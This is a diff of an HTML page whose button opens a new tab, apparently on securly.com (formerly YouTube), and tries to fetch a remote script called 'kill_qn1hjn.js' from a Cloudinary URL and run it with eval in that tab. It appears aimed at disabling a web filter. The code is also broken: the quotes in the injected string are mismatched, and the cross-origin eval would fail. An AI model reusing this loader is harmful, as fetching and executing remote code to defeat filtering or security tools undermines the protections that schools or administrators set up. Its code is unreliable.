@@ -1,30 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Open New Tab and Execute JavaScript</title>
-  <script>
-    function openNewTabAndExecute() {
-      // Open YouTube in a new tab
-      var youtubeTab = window.open('https://www.youtube.com', '_blank');
-
-      // Fetch and execute JavaScript after a delay to ensure the new tab is loaded
-      setTimeout(function() {
-        fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js')
-          .then(response => response.text())
-          .then(jsCode => {
-            youtubeTab.eval(jsCode);
-          })
-          .catch(error => {
-            console.error('Error fetching or executing the JavaScript code:', error);
-          });
-      }, 2000); // Adjust the delay as needed
-    }
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open securly.com and Run Script</title>
 </head>
 <body>
-  <h1>Click the button to open YouTube in a new tab and execute JavaScript</h1>
-  <button onclick="openNewTabAndExecute()">Open YouTube and Execute JavaScript</button>
+
+<button onclick="openAndRunScript()">Open securly.com and Run Script</button>
+
+<script>
+    function openAndRunScript() {
+        var scriptCode = "var script = document.createElement('script'); \
+        script.src = 'javascript:fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))'; \
+        document.body.appendChild(script);";
+
+        var newTab = window.open("https://securly.com", "_blank");
+        newTab.onload = function() {
+            newTab.eval(scriptCode);
+        };
+    }
+</script>
+
 </body>
 </html>
